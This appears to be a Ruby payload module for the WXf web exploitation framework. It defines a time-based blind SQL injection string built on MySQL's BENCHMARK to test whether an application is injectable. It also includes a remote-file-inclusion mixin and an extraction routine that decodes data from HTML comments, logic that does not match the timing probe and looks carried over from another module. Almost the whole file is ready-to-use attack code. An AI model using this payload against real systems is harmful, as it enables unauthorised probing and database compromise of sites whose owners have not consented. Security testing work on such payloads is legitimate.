require 'base64'

class WebXploit <  WXf::WXfmod_Factory::Payload
  
  include WXf::WXfassists::Payload::RFI

  def initialize
        super( 
    'Name'        => 'SQL Benchmark Payload',
    'Version'     => '1.0',
    'Description' => %q{
     A basic SQL benchmark payload to determine whether application is vulnerable.                },
    'Author'      => [ 'John M. Poulin' ],
    'License'     => WXF_LICENSE
)
     init_opts([

     ])
      
  end
  
  def payload_data   
    return "-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)#"
  end
  
  def payload_extraction(data)
    extract_data = data.to_s.match(/<!--<#>(.*?)<%>-->/m) 
    if extract_data.kind_of?(MatchData) 
    datahash['ENCODE'] == true ? prnt_plus(Base64.decode64("#{extract_data[1]}")): prnt_plus(extract_data[1])
    else
      prnt_err("Exploit unsuccessful")   
    end
  end 
            
          
      
          
          
    
end
